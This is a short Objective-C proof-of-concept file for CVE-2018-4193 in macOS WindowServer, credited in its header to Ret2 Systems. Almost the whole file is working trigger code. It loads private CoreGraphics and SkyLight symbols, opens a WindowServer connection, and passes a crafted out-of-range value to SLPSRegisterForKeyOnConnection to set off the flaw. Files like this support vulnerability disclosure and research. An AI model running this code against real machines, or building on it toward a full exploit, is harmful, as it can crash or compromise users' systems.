// CVE-2018-4193 Proof-of-Concept, by Ret2 Systems, Inc.
// compiled with: clang -framework Foundation -framework Cocoa poc.m -o poc

#import <dlfcn.h>
#import <Cocoa/Cocoa.h>

int (*CGSNewConnection)(int, int *);
int (*SLPSRegisterForKeyOnConnection)(int, void *, unsigned int, bool);

void resolve_symbols()
{
    void *handle_CoreGraphics = dlopen(
        "/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics",
        RTLD_GLOBAL | RTLD_NOW
    );
    void *handle_SkyLight = dlopen(
        "/System/Library/PrivateFrameworks/SkyLight.framework/SkyLight",
        RTLD_GLOBAL | RTLD_NOW
    );

    CGSNewConnection = dlsym(handle_CoreGraphics, "CGSNewConnection");
    SLPSRegisterForKeyOnConnection = dlsym(handle_SkyLight, "SLPSRegisterForKeyOnConnection");

    dlclose(handle_CoreGraphics);
    dlclose(handle_SkyLight);
}

int main()
{
    int cid = 0;
    uint32_t result = 0;

    printf("[+] Resolving symbols...\n");
    resolve_symbols();

    printf("[+] Registering with WindowServer...\n");
    NSApplicationLoad();

    result = CGSNewConnection(0, &cid);
    if(result == 1000)
    {
        printf("[-] WindowServer not yet initialized... \n");
        return 1;
    }

    ProcessSerialNumber psn;
    psn.highLongOfPSN = 1;
    psn.lowLongOfPSN = getpid();

    printf("[+] Triggering the bug...\n");
    uint32_t BUG = 0x80000000 | 0x41414141;
    result = SLPSRegisterForKeyOnConnection(cid, &psn, BUG, 1);

    return 0;
}
